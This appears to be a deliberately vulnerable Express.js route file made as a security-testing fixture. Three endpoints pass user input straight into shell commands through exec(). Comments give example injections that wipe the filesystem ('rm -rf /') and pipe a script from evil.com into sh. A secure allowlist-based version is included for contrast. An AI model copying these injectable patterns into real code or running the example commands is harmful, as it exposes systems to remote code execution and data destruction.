/**
 * Files Route - Contains Command Injection Vulnerability
 * WARNING: This code is intentionally vulnerable for testing purposes
 */

const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

// GET /api/files/read?filename=log.txt
// VULNERABILITY #4: Command Injection (HIGH severity)
router.get('/read', (req, res) => {
  const filename = req.query.filename;
  
  // Dangerous: User input passed directly to shell command
  // An attacker could pass: log.txt; rm -rf / 
  // Or: log.txt && curl http://evil.com/malware.sh | sh
  exec(`cat ${filename}`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send(`Error: ${error.message}`);
    }
    if (stderr) {
      return res.status(500).send(`Error: ${stderr}`);
    }
    res.send(stdout);
  });
});

// POST /api/files/search
// Another command injection variant
router.post('/search', (req, res) => {
  const pattern = req.body.pattern;
  const directory = req.body.directory || '.';
  
  // Vulnerable: grep with unsanitized input
  exec(`grep -r "${pattern}" ${directory}`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send(`Error: ${error.message}`);
    }
    res.send(stdout);
  });
});

// GET /api/files/compress?file=document.txt
router.get('/compress', (req, res) => {
  const file = req.query.file;
  
  // Vulnerable: Command injection via tar
  exec(`tar -czf ${file}.tar.gz ${file}`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send(`Error: ${error.message}`);
    }
    res.send(`File ${file} compressed successfully`);
  });
});

// SECURE EXAMPLE (for contrast - should not trigger alerts)
router.get('/secure/read', (req, res) => {
  const filename = req.query.filename;
  
  // Correct: Using fs.readFile instead of shell command
  // Plus input validation
  const allowedFiles = ['log.txt', 'data.csv', 'report.txt'];
  
  if (!allowedFiles.includes(filename)) {
    return res.status(400).send('Invalid filename');
  }
  
  const safePath = path.join(__dirname, '../../data', filename);
  
  fs.readFile(safePath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).send('Error reading file');
    }
    res.send(data);
  });
});

module.exports = router;
